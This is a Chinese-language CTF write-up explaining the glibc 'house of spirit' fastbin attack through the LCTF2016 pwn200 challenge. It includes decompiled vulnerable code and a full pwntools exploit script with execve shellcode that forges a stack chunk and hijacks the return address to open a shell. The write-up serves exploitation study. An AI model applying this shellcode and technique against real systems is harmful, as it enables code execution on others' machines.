# house of spirit 
## Author: fanda
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>house系列之house of spirit，fastbin attack之一。<br>&nbsp;&nbsp;&nbsp;&nbsp;首先不可缺少的先贴[how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c)以及[ctfwiki](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack/)两大pwn入门学习神资料。</font><br>

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>完了之后这里以一题我当时学习的LCTF2016例题pwn200来讲解，顺便贴上我当时学习的[原帖](http://pwn4.fun/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/)。程序开头是这样的：</font><br>

```C
int sub_400A8E()
{
  signed __int64 i; // [rsp+10h] [rbp-40h]
  char v2[48]; // [rsp+20h] [rbp-30h]

  puts("who are u?");
  for ( i = 0LL; i <= 47; ++i )
  {
    read(0, &v2[i], 1uLL);
    if ( v2[i] == 10 )
    {
      v2[i] = 0;
      break;
    }
  }
  printf("%s, welcome to xdctf~\n", v2);
  puts("give me your id ~~?");
  gets();
  return sub_400A29();
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>经典的read代码，虽然没有溢出但是v2缓冲区没有'\0'截断，因此泄露了栈地址；在这里gets()函数（我重命名之后）的返回值事实上是保存在栈上了，看伪代码看不出来，但是反汇编很清楚，可以作为栈上伪造chunk的size，继续深入：</font><br>

```C
int sub_400A29()
{
  char buf; // [rsp+0h] [rbp-40h]
  char *dest; // [rsp+38h] [rbp-8h]

  dest = (char *)malloc(0x40uLL);
  puts("give me money~");
  read(0, &buf, 0x40uLL);
  strcpy(dest, &buf);
  ptr = dest;
  return sub_4009C4();
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>仔细看，这里buf接受0x40大小，而根据栈，实际上buf的最后8个字节是可以修改dest的地址的，那么实际上在这里已经可以控制写入地址了，那么我们把dest修改到printf函数的got表处，然后strcpy写入的时候把printf函数的got表修改为shellcode的入口地址处不就完了？没错，完了:)</font><br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>但既然我们是来学house of spirit还是不用这种“歪”脑筋吧，老老实实的把dest修改到栈上（具体可以根据之前泄露的栈地址精确计算到想要的地方），然后free之，再重新malloc就会把这个堆块再返回过来，然后就可以随意控制这一片栈了。</font><br>

脚本
======

```python
#搬运大佬BruceFan的脚本，plus非预期解

#encoding:utf-8
from pwn import *

#r = remote('127.0.0.1', 6666)
p = process("./pwn200")
elf = ELF('./pwn200')
printf_got=elf.got['printf']

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

def pwn():
    # gdb.attach(p, "b *0x400991")

    data = shellcode.ljust(46, 'a')
    data += 'bb'
    p.send(data)
    p.recvuntil('bb')
    rbp_addr = p.recvuntil(', w')[:-3]
    rbp_addr = u64(rbp_addr.ljust(8,'\x00'))
    print hex(rbp_addr)

    fake_addr = rbp_addr - 0x90
    #fake_addr = printf_got
    
    shellcode_addr = rbp_addr - 0x50
    # 输入id伪造下一个堆块的size
    p.recvuntil('id ~~?')
    p.sendline('32')

    p.recvuntil('money~')
    
    #data = p64(shellcode_addr)+p64(0)*4+p64(0x41) 覆盖printf之got表为shellcode地址
    data = p64(0) * 5 + p64(0x41) # 伪造堆块的size
    data = data.ljust(0x38, '\x00') + p64(fake_addr) # 覆盖堆指针
    p.send(data)

    p.recvuntil('choice : ')
    p.sendline('2') # 释放伪堆块进入fastbin

    p.recvuntil('choice : ')
    p.sendline('1')
    p.recvuntil('long?')
    p.sendline('48')
    p.recvuntil('\n48\n') # 将伪堆块申请出来
    data = 'a' * 0x18 + p64(shellcode_addr) # 将eip修改为shellcode的地址
    data = data.ljust(48, '\x00')
    p.send(data)
    p.recvuntil('choice : ')
    p.sendline('3') # 退出返回时回去执行shellcode

    p.interactive()

if __name__ == '__main__':
    pwn()

```
